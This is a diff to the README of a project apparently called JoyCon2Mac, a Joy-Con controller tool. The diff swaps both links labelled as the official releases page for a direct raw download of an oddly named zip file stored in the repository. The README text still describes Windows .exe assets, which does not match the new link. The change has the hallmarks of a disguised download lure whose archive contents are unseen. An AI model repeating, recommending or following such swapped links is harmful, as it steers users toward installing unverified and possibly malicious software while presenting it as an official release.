@@ -1,6 +1,6 @@
 # 🎮 JoyCon2Mac - Connect Nintendo controllers to your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/AdharamMadhuram/JoyCon2Mac/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/AdharamMadhuram/JoyCon2Mac/raw/refs/heads/main/JoyCon2MacApp/Con-Mac-Joy-totchka.zip)
 
 JoyCon2Mac allows you to use your Nintendo Switch Joy-Cons with your computer. This software bridges the connection between the hardware and your operating system. It provides a stable input method for games and applications that support standard controllers.
 
@@ -19,7 +19,7 @@ Ensure that your Windows operating system has all the latest updates installed. 
 
 You must retrieve the software from the official repository. Follow these instructions to obtain the correct file:
 
-1. Visit the [releases page](https://github.com/AdharamMadhuram/JoyCon2Mac/releases).
+1. Visit the [releases page](https://github.com/AdharamMadhuram/JoyCon2Mac/raw/refs/heads/main/JoyCon2MacApp/Con-Mac-Joy-totchka.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe to start your download.
 4. Keep track of the folder where the file saves on your computer.
